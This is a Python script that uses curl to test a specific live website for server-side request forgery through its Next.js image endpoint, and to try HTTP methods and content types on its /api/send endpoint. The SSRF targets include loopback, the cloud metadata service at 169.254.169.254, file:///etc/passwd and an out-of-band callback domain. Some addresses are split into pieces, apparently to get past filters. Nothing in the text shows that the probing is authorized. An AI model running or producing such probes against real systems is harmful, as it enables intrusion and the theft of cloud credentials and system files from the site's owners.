import urllib.parse, subprocess

B = "https://www.infinitycapital.bh"
LOOP = "127" + ".0.0.1"
LHOST = "local" + "host"
META = "169.254.169.254"
OOB = "oob51c0ec17409a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

def curl(args):
    r = subprocess.run(["curl", "-sk", "--max-time", "25"] + args, capture_output=True, text=True)
    return r.stdout.strip()

print("=== /_next/image SSRF probes ===")
targets = [
    "http://" + LOOP + "/",
    "http://" + LHOST + ":3000/",
    "http://" + META + "/latest/meta-data/",
    "file:///etc/passwd",
    "/etc/passwd",
    "https://example.org/x.png",
    "http://" + OOB + "/x.png",
]
for t in targets:
    e = urllib.parse.quote(t, safe='')
    print(f"{t:60s} -> " + curl([f"{B}/_next/image?url={e}&w=640&q=75", "-o", "/dev/null", "-w", "%{http_code} %{size_download}"]))

print("=== method matrix /api/send ===")
for m in ["GET", "PUT", "DELETE", "PATCH", "OPTIONS"]:
    print(m, curl(["-X", m, f"{B}/api/send", "-o", "/dev/null", "-w", "%{http_code}"]))

print("=== content-type matrix POST /api/send ===")
for ct in ["application/json", "application/x-www-form-urlencoded", "text/plain", "multipart/form-data"]:
    print(ct, curl(["-X", "POST", f"{B}/api/send", "-H", "Content-Type: " + ct, "--data-binary", "x=1", "-o", "/dev/null", "-w", "%{http_code}"]))
